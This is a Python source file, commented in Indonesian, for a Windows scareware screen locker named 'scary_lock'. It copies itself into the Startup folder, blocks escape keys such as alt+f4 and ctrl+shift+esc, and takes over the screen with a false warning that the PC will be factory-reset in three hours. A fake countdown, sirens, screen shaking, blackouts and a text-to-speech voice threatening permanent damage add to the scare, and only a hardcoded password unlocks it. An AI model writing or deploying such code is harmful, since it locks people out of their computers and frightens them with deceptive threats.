import tkinter as tk
import hashlib
import keyboard
import sys
import os
import shutil
import time
import random
from threading import Thread
import winsound
import win32com.client  # <== untuk TTS Windows

# ============ SET PASSWORD ============
PLAIN_PASSWORD = "sampah"
PASSWORD_HASH = hashlib.sha256(PLAIN_PASSWORD.encode()).hexdigest()
# ======================================

# Tambahkan ke startup Windows
def add_to_startup():
    startup_path = os.path.join(
        os.getenv("APPDATA"),
        "Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    )
    exe_path = sys.argv[0]
    if exe_path.endswith(".exe"):
        target = os.path.join(startup_path, "scary_lock.exe")
        if not os.path.exists(target):
            try:
                shutil.copy(exe_path, target)
            except:
                pass
add_to_startup()

# Blokir tombol shortcut keluar
def block_keys():
    keys = [
        "alt", "tab", "esc", "win",
        "ctrl+shift+esc", "alt+f4",
        "ctrl+c"
    ]
    for k in keys:
        try:
            keyboard.block_key(k)
        except:
            pass
block_keys()

# Buat jendela fullscreen
root = tk.Tk()
root.title("System Lock")
root.attributes("-fullscreen", True)
root.configure(bg="black")

canvas = tk.Canvas(root, width=root.winfo_screenwidth(),
                   height=root.winfo_screenheight(),
                   highlightthickness=0, bg="black")
canvas.pack(fill="both", expand=True)

# Tulisan ancaman
warning_text = canvas.create_text(
    root.winfo_screenwidth()//2, 100,
    text="⚠ PC ANDA AKAN DIKEMBALIKAN\nKE SETELAN PABRIK DALAM 3 JAM ⚠",
    fill="red", font=("Arial Black", 32), justify="center"
)

# Timer countdown palsu
time_left = 3*60*60  # 3 jam
timer_text = canvas.create_text(
    root.winfo_screenwidth()//2, 200,
    text="", fill="white", font=("Consolas", 40)
)

def update_timer():
    global time_left
    while time_left > 0:
        hrs = time_left // 3600
        mins = (time_left % 3600) // 60
        secs = time_left % 60
        timer_str = f"{hrs:02}:{mins:02}:{secs:02}"
        canvas.itemconfig(timer_text, text=timer_str)
        time.sleep(1)
        time_left -= 1

Thread(target=update_timer, daemon=True).start()

# Password input
entry = tk.Entry(root, show="*", font=("Arial", 20), justify="center")
entry_window = canvas.create_window(
    root.winfo_screenwidth()//2, 400, window=entry, width=300
)

status = tk.Label(root, text="", fg="red", bg="black", font=("Arial", 14))
status_window = canvas.create_window(
    root.winfo_screenwidth()//2, 450, window=status
)

def check_password(event=None):
    user_input = entry.get()
    user_hash = hashlib.sha256(user_input.encode()).hexdigest()
    if user_hash == PASSWORD_HASH:
        root.destroy()
        sys.exit(0)
    else:
        status.config(text="❌ PASSWORD SALAH ❌")
        entry.delete(0, tk.END)

entry.bind("<Return>", check_password)
entry.focus_set()

# Efek teks berkedip
def blink_text():
    while True:
        canvas.itemconfig(warning_text, fill="red")
        time.sleep(0.5)
        canvas.itemconfig(warning_text, fill="yellow")
        time.sleep(0.5)

Thread(target=blink_text, daemon=True).start()

# Sirine suara beep
def play_siren():
    while True:
        winsound.Beep(1000, 500)
        winsound.Beep(800, 500)
        time.sleep(2)

Thread(target=play_siren, daemon=True).start()

# Efek layar bergetar
def shake_window():
    while True:
        x = root.winfo_x()
        y = root.winfo_y()
        for _ in range(10):
            dx = random.randint(-10, 10)
            dy = random.randint(-10, 10)
            root.geometry(f"+{x+dx}+{y+dy}")
            time.sleep(0.02)
        root.geometry(f"+{x}+{y}")
        time.sleep(random.randint(5, 15))

Thread(target=shake_window, daemon=True).start()

# Efek layar blank hitam sesekali
def random_blackout():
    while True:
        time.sleep(random.randint(20, 40))
        canvas.itemconfig(warning_text, text="")
        canvas.itemconfig(timer_text, text="")
        entry.place_forget()
        status.config(text="")
        root.configure(bg="black")
        time.sleep(3)
        canvas.itemconfig(warning_text, text="⚠ PC ANDA AKAN DIKEMBALIKAN\nKE SETELAN PABRIK DALAM 3 JAM ⚠")
        entry.place(x=root.winfo_screenwidth()//2-150, y=400)
        root.configure(bg="black")

Thread(target=random_blackout, daemon=True).start()

# 🔊 Efek suara hacker pakai TTS
def hacker_voice():
    speaker = win32com.client.Dispatch("SAPI.SpVoice")
    while True:
        time.sleep(15)  # tiap 15 detik ngomong
        speaker.Speak("Warning. Your computer will be permanently damaged if you fail to enter the correct password.")

Thread(target=hacker_voice, daemon=True).start()

root.mainloop()
